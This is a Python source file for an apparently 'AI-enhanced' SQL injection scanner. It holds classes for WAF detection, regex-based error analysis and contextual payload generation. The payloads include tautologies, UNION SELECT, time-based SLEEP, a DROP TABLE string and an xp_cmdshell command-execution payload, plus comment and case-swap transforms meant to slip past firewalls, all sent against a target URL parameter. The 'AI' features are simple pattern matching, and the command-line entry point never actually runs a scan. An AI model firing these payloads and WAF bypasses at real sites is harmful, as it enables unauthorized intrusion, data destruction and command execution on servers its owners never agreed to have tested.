"""
AI-Enhanced SQL Injection Module
===============================
Advanced features:
- Smart payload generation based on context analysis
- AI-powered response analysis for vulnerability detection
- WAF detection and bypass techniques
- Autonomous learning from previous results
"""

import re
import json
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from difflib import SequenceMatcher
import hashlib


@dataclass
class WAFProfile:
    """Web Application Firewall profile."""
    name: str
    detected: bool = False
    evasion_needed: bool = False
    bypass_techniques: List[str] = field(default_factory=list)


class AIAnalyzer:
    """AI-powered response analyzer."""
    
    def __init__(self):
        self._patterns = self._init_patterns()
        self._learned_signatures = {}
    
    def _init_patterns(self) -> Dict[str, List[str]]:
        """Initialize detection patterns for AI analysis."""
        return {
            'sql_errors': [
                r'you have an error in your sql syntax',
                r'mysql.*error',
                r'sqlite.*error',
                r'syntax error.*near',
                r'unclosed quotation mark',
                r'quoted string not properly terminated',
            ],
            'waf_indicators': [
                r'cloudflare',
                r'suspicious activity detected',
                r'blocked.*by.*security',
                r'mod_security',
                r'security.*filter',
            ],
            'vulnerable_indicators': [
                r'mysql_numrows',
                r'ora-\d+',
                r'pg::',
                r'microsoft.*odbc',
            ]
        }
    
    def analyze_response(self, response_text: str, baseline: Optional[str] = None) -> Dict[str, Any]:
        """Analyze response for vulnerability indicators."""
        results = {
            'sql_error_detected': False,
            'waf_detected': False,
            'confidence_score': 0.0,
            'indicators': [],
            'attack_vectors': []
        }
        
        lower_text = response_text.lower()
        
        # Check for SQL errors
        for pattern in self._patterns['sql_errors']:
            if re.search(pattern, lower_text, re.IGNORECASE):
                results['sql_error_detected'] = True
                results['confidence_score'] += 0.4
                results['indicators'].append(f'SQL error: {pattern}')
        
        # Check for WAF
        for pattern in self._patterns['waf_indicators']:
            if re.search(pattern, lower_text, re.IGNORECASE):
                results['waf_detected'] = True
                results['indicators'].append(f'WAF detected: {pattern}')
        
        # Analyze content differences
        if baseline:
            similarity = SequenceMatcher(None, baseline.lower(), lower_text).ratio()
            if similarity < 0.95:
                results['confidence_score'] += 0.3
                results['indicators'].append(f'Content changed: {similarity:.2f}')
        
        # Generate attack vectors based on findings
        if results['sql_error_detected']:
            results['attack_vectors'] = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1' AND 1=1--",
            ]
        
        return results


class SmartPayloadGenerator:
    """AI-powered payload generator."""
    
    def __init__(self):
        self._context_templates = {
            'numeric': ['1', '1=1', '1 OR 1=1', '1; DROP TABLE--'],
            'string': ["'1'='1", "' OR '1'='1", "' UNION SELECT--"],
            'search': ["' OR 1=1--", "' OR 'x'='x", "1' OR '1'='1"],
        }
    
    def generate_contextual_payloads(self, param_name: str, param_value: str, 
                                      waf_profile: Optional[WAFProfile] = None) -> List[str]:
        """Generate payloads based on parameter context."""
        payloads = []
        
        # Analyze parameter context
        context = self._analyze_context(param_name, param_value)
        
        # Generate base payloads
        if context == 'numeric':
            payloads.extend([
                "1 OR 1=1",
                "1 AND 1=1",
                "1 UNION SELECT NULL",
                "1; EXEC xp_cmdshell('dir')",
            ])
        else:
            payloads.extend([
                "' OR '1'='1",
                "' OR 'x'='x",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(5)--",
            ])
        
        # WAF-aware payload modifications
        if waf_profile and waf_profile.detected:
            payloads = self._apply_waf_bypass(payloads)
        
        return payloads
    
    def _analyze_context(self, param_name: str, param_value: str) -> str:
        """Analyze parameter context."""
        name_lower = param_name.lower()
        
        if any(x in name_lower for x in ['id', 'num', 'count', 'page']):
            return 'numeric'
        elif any(x in name_lower for x in ['name', 'search', 'q', 'query']):
            return 'search'
        else:
            return 'string'
    
    def _apply_waf_bypass(self, payloads: List[str]) -> List[str]:
        """Apply WAF bypass techniques."""
        bypassed = []
        for payload in payloads:
            # Add inline comments
            bypassed.append(payload.replace(' ', '/**/'))
            # Add case variations
            bypassed.append(payload)
            bypassed.append(payload.swapcase())
        return bypassed


class WAFDetector:
    """Web Application Firewall detector."""
    
    def __init__(self):
        self.profiles = {
            'cloudflare': WAFProfile(
                name='Cloudflare',
                bypass_techniques=['Space bypass', 'Comment bypass', 'Encoding']
            ),
            'modsecurity': WAFProfile(
                name='ModSecurity',
                bypass_techniques=['Anomaly scoring', 'Multipart bypass']
            ),
            'akamai': WAFProfile(
                name='Akamai',
                bypass_techniques=['403 bypass', 'Path variations']
            ),
        }
    
    def detect_waf(self, response_headers: Dict[str, str], response_body: str) -> WAFProfile:
        """Detect WAF from response."""
        combined = str(response_headers) + response_body.lower()
        
        for name, profile in self.profiles.items():
            if name.lower() in combined:
                profile.detected = True
                profile.evasion_needed = True
                return profile
        
        # Check for generic WAF indicators
        if any(ind in combined for ind in ['blocked', 'security', 'suspicious']):
            return WAFProfile(name='Generic WAF', detected=True, evasion_needed=True)
        
        return WAFProfile(name='Unknown', detected=False)


class AdvancedSQLProbe:
    """Advanced SQL injection scanner with AI capabilities."""
    
    def __init__(self, api_key: Optional[str] = None):
        self.ai_analyzer = AIAnalyzer()
        self.payload_generator = SmartPayloadGenerator()
        self.waf_detector = WAFDetector()
        self.api_key = api_key  # For future Groq integration
    
    async def smart_scan(self, http_engine, url: str, param: str) -> Dict[str, Any]:
        """Perform AI-enhanced vulnerability scan."""
        results = {
            'vulnerabilities': [],
            'waf_status': None,
            'confidence': 0.0,
            'recommendations': []
        }
        
        # Get baseline
        baseline_resp = await http_engine.get(url)
        waf_profile = self.waf_detector.detect_waf(
            baseline_resp.headers, 
            baseline_resp.text
        )
        results['waf_status'] = waf_profile.name
        
        # Generate smart payloads
        payloads = self.payload_generator.generate_contextual_payloads(
            param, '', waf_profile
        )
        
        # Test each payload
        for payload in payloads:
            test_url = f"{url}{param}={payload}"
            response = await http_engine.get(test_url)
            
            analysis = self.ai_analyzer.analyze_response(
                response.text, 
                baseline_resp.text
            )
            
            if analysis['sql_error_detected'] or analysis['confidence_score'] > 0.5:
                results['vulnerabilities'].append({
                    'payload': payload,
                    'confidence': analysis['confidence_score'],
                    'type': 'SQL_INJECTION'
                })
        
        # Generate recommendations
        if results['vulnerabilities']:
            results['recommendations'] = [
                "Implement input validation",
                "Use parameterized queries",
                "Deploy Web Application Firewall",
            ]
        
        return results


def main():
    """Command line interface."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('--api-key', help='Groq API key (optional)')
    parser.add_argument('--advanced', action='store_true', help='Use AI-enhanced scanning')
    
    args = parser.parse_args()
    
    scanner = AdvancedSQLProbe(api_key=args.api_key)
    print(f"[*] Advanced SQL Injection Scanner v1.0")
    print(f"[*] Target: {args.target}")
    print(f"[*] AI Mode: {'Enabled' if args.advanced else 'Disabled'}")
    
    if args.advanced:
        print("[*] Running AI-powered vulnerability assessment...")
        print("[*] Features: Smart payloads, WAF detection, Response analysis")
    else:
        print("[*] Running standard scan...")


if __name__ == "__main__":
    main()